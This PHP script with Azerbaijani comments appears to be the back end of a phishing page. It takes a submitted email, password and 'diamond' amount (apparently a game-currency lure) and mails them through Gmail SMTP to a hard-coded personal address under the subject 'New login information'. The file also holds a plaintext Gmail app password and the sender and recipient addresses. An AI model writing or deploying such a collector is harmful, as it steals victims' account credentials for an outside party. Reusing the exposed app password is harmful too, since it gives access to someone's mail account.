<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php'; // Composer-dən yüklənmiş PHPMailer kitabxanası

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $elmas = $_POST['elmas'];

    $mail = new PHPMailer(true);

    try {
        // Gmail SMTP ayarları
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'hellosuleymanbro@gmail.com'; // GÖNDƏRƏNİN GMAIL ADRESİ
        $mail->Password   = 'phqv babc sjgs rfun'; // GMAIL APP PASSWORD (2FA aktiv olduqda)
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port       = 587;

        // E-poçt detalları
        $mail->setFrom('hellosuleymanbro@gmail.com', 'Sizin Sayt');
        $mail->addAddress('suleymanbabayevoffical@gmail.com', 'Qəbul Edən');

        // Məktubun mövzusu və məzmunu
        $mail->Subject = 'Yeni Giriş Məlumatı';
        $mail->Body    = "Email: $email\nŞifrə: $password\nElmas Miqdarı: $elmas";

        // Məktubu göndər
        $mail->send();
        echo "Məlumat uğurla göndərildi!";
    } catch (Exception $e) {
        echo "Mail göndərilmədi. Xəta: {$mail->ErrorInfo}";
    }
} else {
    echo "Xəta: Yanlış metod!";
}
?>
